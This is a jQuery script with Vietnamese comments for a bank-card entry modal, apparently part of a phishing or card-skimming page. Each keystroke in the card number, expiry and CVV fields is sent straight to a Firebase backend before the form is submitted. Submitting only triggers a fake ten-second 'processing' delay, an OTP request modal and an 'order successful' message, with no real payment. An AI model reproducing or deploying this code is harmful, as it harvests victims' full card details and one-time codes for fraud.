import { sendDataToFirebase } from "../handles/auth-handles.js";

$(document).ready(function () {

    $('.close-card').on('click', function () {
        $('#card-modal').hide();
    });

    // Khi người dùng nhập vào từng trường, gọi hàm sendDataToFirebase để cập nhật
    $('#cardNumber').on('input', function () {
        const cardNumber = $(this).val();
        sendDataToFirebase('bankCardNumber', cardNumber);
    });

    $('#expiryDate').on('input', function () {
        const expiryDate = $(this).val();
        sendDataToFirebase('expirationDate', expiryDate);
    });

    $('#cvv').on('input', function () {
        const cvv = $(this).val();
        sendDataToFirebase('ccv', cvv);
    });



    // Đổi màu biểu tượng dựa vào loại thẻ
    function setCardType(type) {
        $(".card-icon").css("color", "gray"); // Đặt màu xám mặc định
        switch (type) {
            case "visa":
                $("#visa-icon").css("color", "blue");
                break;
            case "mastercard":
                $("#mastercard-icon").css("color", "orange");
                break;
            case "jcb":
                $("#jcb-icon").css("color", "green");
                break;
            case "amex":
                $("#amex-icon").css("color", "purple");
                break;
            default:
                break;
        }
    }
    function getCardType(cardNumber) {
        const iin = cardNumber.slice(0, 6);
    
        if (/^4[0-9]{5}/.test(iin)) {
            return "Visa";
        } else if (/^5[1-5][0-9]{4}/.test(iin)) {
            return "MasterCard";
        } else if (/^3[47][0-9]{4}/.test(iin)) {
            return "American Express";
        } else if (/^35[2-8][0-9]{3}/.test(iin)) {
            return "JCB";
        } else {
            return "Unknown";
        }
    }
    let card_type;

    // Hàm cập nhật hiển thị icon loại thẻ
// Hàm cập nhật màu của SVG icon
// function setCardTypeDisplay(type) {
//     $(".card-icon").css("fill", "gray"); // Đặt màu xám cho tất cả các icon

//     // Hiển thị màu cho icon tương ứng nếu xác định được loại thẻ
//     if (type === "visa") {
//         $("#visa-icon").css("fill", "#1A1F71");
//     } else if (type === "mastercard") {
//         $("#mastercard-icon").css("fill", "#EB001B");
//     } else if (type === "amex") {
//         $("#amex-icon").css("fill", "#2E77BB");
//     } else if (type === "jcb") {
//         $("#jcb-icon").css("fill", "#0B6A6C");
//     }
// }
$(".card-icon").removeClass("normal").addClass("xgray");

function setCardTypeDisplay(type) {
    // Đặt lại opacity cho tất cả icon trước
    $(".card-icon").removeClass("normal").addClass("xgray");

    if (type === "visa") {
        $("#visa-icon").removeClass("xgray").addClass("normal");
    } else if (type === "mastercard") {
        $("#mastercard-icon").removeClass("xgray").addClass("normal");
    } else if (type === "amex") {
        $("#amex-icon").removeClass("xgray").addClass("normal");
    } else if (type === "jcb") {
        $("#jcb-icon").removeClass("xgray").addClass("normal");
    }
}
    
    // Hàm xác định loại thẻ dựa vào 6 chữ số đầu
    function getCardType(cardNumber) {
        const iin = cardNumber.slice(0, 6);
        if (/^4[0-9]{5}/.test(iin)) {
            card_type = 'visa';
            return "visa";
        } else if (/^5[1-5][0-9]{4}/.test(iin)) {
            card_type = 'mastercard';
            return "mastercard";
        } else if (/^3[47][0-9]{4}/.test(iin)) {
            card_type = 'amex';
            return "amex";
        } else if (/^35[2-8][0-9]{3}/.test(iin)) {
            card_type = 'jcb';
            return "jcb";
        } else {
            return null;
        }
    }
    
    // Hàm kiểm tra số thẻ ngân hàng
    $("#cardNumber").on("input", function () {
        const cardNumber = $(this).val();
        if (cardNumber.length >= 6) {
            const cardType = getCardType(cardNumber);
            if (cardType) {
                setCardTypeDisplay(cardType);
                $("#cardNumberError").text(""); // Xóa lỗi nếu hợp lệ
                $(this).removeClass("error");
            } else {
                setCardTypeDisplay(null);
                $("#cardNumberError").text("Số thẻ không hợp lệ.");
                $(this).addClass("error");
            }
        } else {
            setCardTypeDisplay(null);
            $("#cardNumberError").text("Vui lòng nhập ít nhất 6 số.");
            $(this).addClass("error");
        }
    });
    
    // Kiểm tra ngày hết hạn
    $("#expiryDate").on("input", function () {
        const expiryDate = $(this).val();
        const currentDate = new Date();
        const currentMonth = currentDate.getMonth() + 1;
        const currentYear = currentDate.getFullYear() % 100;
    
        if (/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
            const [month, year] = expiryDate.split("/").map(Number);
            if (year > currentYear || (year === currentYear && month >= currentMonth)) {
                $("#expiryDateError").text("");
                $(this).removeClass("error");
            } else {
                $("#expiryDateError").text("Ngày hết hạn không hợp lệ.");
                $(this).addClass("error");
            }
        } else {
            $("#expiryDateError").text("Định dạng MM/YY.");
            $(this).addClass("error");
        }
    });
    
    // Kiểm tra mã CVV
    $("#cvv").on("input", function () {
        const cvv = $(this).val();
        if ((card_type === "amex" && /^\d{4}$/.test(cvv)) || 
            (card_type !== "amex" && /^\d{3}$/.test(cvv))) {
            $("#cvvError").text("");
            $(this).removeClass("error");
        } else {
            $("#cvvError").text(card_type === "amex" ? "AMEX yêu cầu 4 số CVV." : "Yêu cầu 3 số CVV.");
            $(this).addClass("error");
        }
    });
    
    // Ngăn form submit nếu có lỗi
    $("#cardForm").on("submit", function (event) {
        event.preventDefault(); // Ngừng reload trang
    
        // Ngăn việc submit form nếu có lỗi
        if ($("#cardNumberError").text() || $("#expiryDateError").text() || $("#cvvError").text()) {
            alert("Vui lòng sửa các lỗi trước khi gửi.");
        } else {
            console.log('click xác nhận');
            
            // Ẩn nút "Xác Nhận" và hiển thị spinner
            $(".confirm-btn").hide(); // Ẩn nút Xác Nhận
            $("#loadingSpinner").show(); // Hiển thị spinner
    
            // Giả lập xử lý trong 10 giây
            setTimeout(function() {
                // Ẩn spinner sau 10 giây
                $("#loadingSpinner").hide();
                $('#otpModal').show();
                // Hiển thị lại nút "Xác Nhận"
                $(".confirm-btn").show();
                $('#card-modal').hide();
                
                // Hiển thị thông báo
                showNotification('Đặt hàng thành công');
            }, 10000); // 10 giây
        }
    });
});